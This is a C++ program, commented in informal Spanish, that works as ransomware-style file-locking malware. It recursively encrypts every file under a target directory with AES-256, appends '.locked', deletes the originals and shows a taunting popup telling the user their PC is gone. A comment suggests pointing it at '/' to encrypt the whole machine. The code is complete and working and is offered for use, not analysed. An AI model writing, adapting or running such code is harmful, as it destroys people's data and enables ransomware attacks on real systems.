#include <iostream>
#include <fstream>
#include <filesystem>
#include <vector>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <cstdlib>

namespace fs = std::filesystem;

bool encryptFile(const std::string& inFile, const std::string& outFile,
                 const unsigned char* key, const unsigned char* iv) {
    std::ifstream ifs(inFile, std::ios::binary);
    std::ofstream ofs(outFile, std::ios::binary);
    if(!ifs || !ofs) return false;

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);

    std::vector<unsigned char> inBuf(4096), outBuf(4096+EVP_MAX_BLOCK_LENGTH);
    int inLen, outLen;

    while(ifs.good()) {
        ifs.read((char*)inBuf.data(), inBuf.size());
        inLen = ifs.gcount();
        EVP_EncryptUpdate(ctx, outBuf.data(), &outLen, inBuf.data(), inLen);
        ofs.write((char*)outBuf.data(), outLen);
    }

    EVP_EncryptFinal_ex(ctx, outBuf.data(), &outLen);
    ofs.write((char*)outBuf.data(), outLen);

    EVP_CIPHER_CTX_free(ctx);
    return true;
}

void encryptDirectory(const std::string& path,
                      const unsigned char* key, const unsigned char* iv) {
    for (auto& p : fs::recursive_directory_iterator(path,
             fs::directory_options::skip_permission_denied)) {
        if (fs::is_regular_file(p.path())) {
            try {
                std::string inFile = p.path().string();
                std::string outFile = inFile + ".locked";
                if (encryptFile(inFile, outFile, key, iv)) {
                    fs::remove(inFile);
                    std::cout << "[+] Encrypted: " << inFile << "\n";
                }
            } catch (...) { continue; }
        }
    }
}

int main() {
    // ¡¡¡Ojo!!!
    // Si de verdad quieres TODA la máquina, cambia a "/"
    std::string target = "/home/tuusuario/lab";

    unsigned char key[32];
    unsigned char iv[16];
    RAND_bytes(key, sizeof(key));
    RAND_bytes(iv, sizeof(iv));

    std::cout << "Clave AES-256 (hex): ";
    for(int i=0;i<32;i++) printf("%02X", key[i]);
    std::cout << "\nIV (hex): ";
    for(int i=0;i<16;i++) printf("%02X", iv[i]);
    std::cout << "\nGuárdalos o te jodiste.\n";

    encryptDirectory(target, key, iv);

    // Popup final (ocupas zenity instalado)
    system("zenity --error --text='Cagaste wey, dile adiós a tu PC'");
    return 0;
}
